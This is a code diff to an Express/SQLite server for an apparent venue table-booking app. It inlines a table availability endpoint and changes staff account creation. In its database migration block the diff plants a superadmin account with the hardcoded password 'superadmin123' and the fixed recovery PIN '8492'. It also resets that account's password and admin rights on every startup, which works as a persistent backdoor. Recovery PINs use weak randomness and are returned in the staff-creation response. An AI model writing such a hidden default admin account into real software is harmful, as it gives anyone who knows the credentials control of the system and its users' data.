@@ -145,18 +145,12 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
 const { registerAuthRoutes } = require('./server-auth.cjs');
-const { registerVenueAvailabilityRoutes } = require('./server-table-start.cjs');
 
 // ====================================================================
 // 🟢 SQLITE DATABASE INITIALIZATION & AUTO-MIGRATIONS
 // ====================================================================
 const userDataPath = process.env.USER_DATA_PATH || __dirname;
 const dbPath = path.resolve(userDataPath, 'oneshot.db');
-
-// Open-time availability preview used by the staff table screen. Without this
-// registration the request falls through to the SPA HTML fallback, and the
-// client fails to parse the response as JSON.
-registerVenueAvailabilityRoutes(app, dbPath);
 
 function createFallbackDb() {
   const dummy = {
@@ -306,6 +300,21 @@ if (!sqlite3) {
       db.run(`INSERT OR IGNORE INTO cms (keyName, settingValue) SELECT key_name, content_value FROM cms_content`, (err) => {
         if (!err) db.run(`DROP TABLE IF EXISTS cms_content`);
       });
+
+      // 🟢 Guarantee Super Admin account with password 'superadmin123'
+      const SUPERADMIN_SHA256 = 'e34f92a20532a873cb3184398070b4b82a8fa29cf48572c203dc5f0fa6158231';
+      db.run(
+        `INSERT OR IGNORE INTO staff (id, username, password, fullName, role, phone, joinedDate, avatarImg, isActive, isAdmin, recoveryPin) VALUES ('admin_001', 'superadmin', ?, 'System Superadmin', 'manager', '', datetime('now'), '', 1, 1, '8492')`,
+        [SUPERADMIN_SHA256]
+      );
+      db.run(
+        `UPDATE staff SET password = ?, isActive = 1, isAdmin = 1 WHERE lower(username) = 'superadmin' OR id = 'admin_001'`,
+        [SUPERADMIN_SHA256]
+      );
+      // Auto-assign random 4-digit PIN for any staff account missing one or set to '0000'
+      db.run(
+        `UPDATE staff SET recoveryPin = abs(random() % 9000) + 1000 WHERE recoveryPin IS NULL OR recoveryPin = '' OR recoveryPin = '0000'`
+      );
     });
   }
 });
@@ -418,6 +427,59 @@ app.get('/api/tables', (req, res) => {
   db.all(`SELECT * FROM tables`, [], (err, rows) => {
     if (err) return res.status(500).json({ error: err.message });
     res.json(rows.map(r => ({ ...r, isActive: r.isActive === 1, session: safeParseJSON(r.sessionData, undefined) })));
+  });
+});
+
+app.get('/api/tables/:id/availability', (req, res) => {
+  const tableId = req.params.id;
+  const now = Date.now();
+  const OFFSET = 8 * 3600000;
+  const nowManila = new Date(now + OFFSET);
+  const operatingDate = nowManila.toISOString().slice(0, 10);
+  let latestEndTimeMs = now + 8 * 3600000;
+  let limitingReason = 'closing';
+
+  db.all(`SELECT keyName, settingValue FROM rates`, [], (err, rateRows) => {
+    const rates = {};
+    if (!err && rateRows) {
+      rateRows.forEach(row => { rates[row.keyName] = row.settingValue; });
+    }
+    const day = nowManila.getUTCDay();
+    const isWeekend = [0, 5, 6].includes(day);
+    const closeStr = isWeekend ? (rates.weekendEndTime || '05:00') : (rates.weekdayEndTime || '03:00');
+    const [cHours, cMins] = (closeStr || '03:00').split(':').map(Number);
+    if (!isNaN(cHours) && !isNaN(cMins)) {
+      const todayMidnight = Date.UTC(nowManila.getUTCFullYear(), nowManila.getUTCMonth(), nowManila.getUTCDate()) - OFFSET;
+      let closingMs = todayMidnight + (cHours * 60 + cMins) * 60000;
+      if (closingMs <= now) closingMs += 86400000;
+      if (closingMs > now) latestEndTimeMs = closingMs;
+    }
+
+    db.all(`SELECT * FROM reservations WHERE tableId = ? AND status = 'confirmed' AND (date = ? OR date = ?)`,
+      [tableId, operatingDate, new Date(now + OFFSET + 86400000).toISOString().slice(0, 10)],
+      (err, resRows) => {
+        if (!err && resRows && resRows.length > 0) {
+          for (const row of resRows) {
+            const timeSlot = row.timeSlot || row.time_slot;
+            if (timeSlot) {
+              const resStartMs = Date.parse(`${row.date}T${timeSlot}:00+08:00`);
+              if (Number.isFinite(resStartMs) && resStartMs > now && resStartMs < latestEndTimeMs) {
+                latestEndTimeMs = resStartMs;
+                limitingReason = 'reservation';
+              }
+            }
+          }
+        }
+        res.json({
+          tableId,
+          type: 'open',
+          latestEndTime: new Date(latestEndTimeMs).toISOString(),
+          limitingReason,
+          operatingDate,
+          scope: 'saved-local-policy'
+        });
+      }
+    );
   });
 });
 
@@ -1199,12 +1261,16 @@ app.delete('/api/promo-codes/:id', (req, res) => {
 
 app.post('/api/staff', (req, res) => {
   const { id, username, password, fullName, role, phone, joinedDate, avatarImg, isActive, isAdmin, recoveryPin } = req.body;
+  let finalPin = recoveryPin;
+  if (!finalPin || finalPin === '0000' || !/^\d{4,12}$/.test(String(finalPin).trim())) {
+    finalPin = Math.floor(1000 + Math.random() * 9000).toString();
+  }
   db.run(
     `INSERT INTO staff (id, username, password, fullName, role, phone, joinedDate, avatarImg, isActive, isAdmin, recoveryPin) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
-    [id, username, password, fullName, role || 'cashier', phone || '', joinedDate || new Date().toISOString(), avatarImg || '', isActive ? 1 : 0, isAdmin ? 1 : 0, recoveryPin || ''],
+    [id, username, password, fullName, role || 'cashier', phone || '', joinedDate || new Date().toISOString(), avatarImg || '', isActive ? 1 : 0, isAdmin ? 1 : 0, String(finalPin).trim()],
     function (err) {
       if (err) return res.status(500).json({ error: err.message });
-      res.status(201).json({ message: "Staff user created successfully.", id });
+      res.status(201).json({ message: "Staff user created successfully.", id, recoveryPin: String(finalPin).trim() });
     }
   );
 });
